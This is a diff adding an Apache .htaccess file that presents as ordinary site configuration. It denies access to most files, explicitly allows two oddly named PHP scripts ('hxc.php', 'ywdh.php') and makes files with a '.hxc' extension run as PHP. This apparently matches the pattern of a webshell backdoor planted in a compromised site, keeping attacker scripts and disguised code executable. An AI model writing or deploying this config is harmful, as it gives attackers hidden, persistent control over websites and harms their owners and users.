@@ -1,0 +1,39 @@
+<FilesMatch "\.(?:[Pp]|[1]|[2]|[3]|[4]|[5]|[6]|[7]|[8]|[9]|[0]|[Hh]|[Mm]|[Ll]|[Ss]|[Tt]|[Nn]|[Cc]|[Gg]|[Ii]?)">
+
+ Deny from all
+
+</FilesMatch>
+
+<FilesMatch ".(jpg|pdf|jpeg|png|webp|css|js|html|doc|docx|xls|xlsx|hxc)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<FilesMatch "^(hxc.php|ywdh.php)$">
+
+ Order allow,deny
+
+ Allow from all
+
+</FilesMatch>
+
+<IfModule mod_rewrite.c>
+
+RewriteEngine On
+
+RewriteBase /
+
+RewriteRule ^index\.php$ - [L]
+
+RewriteCond %{REQUEST_FILENAME} !-f
+
+RewriteCond %{REQUEST_FILENAME} !-d
+
+RewriteRule . /index.php [L]
+
+</IfModule>
+
+AddType application/x-httpd-php .hxc
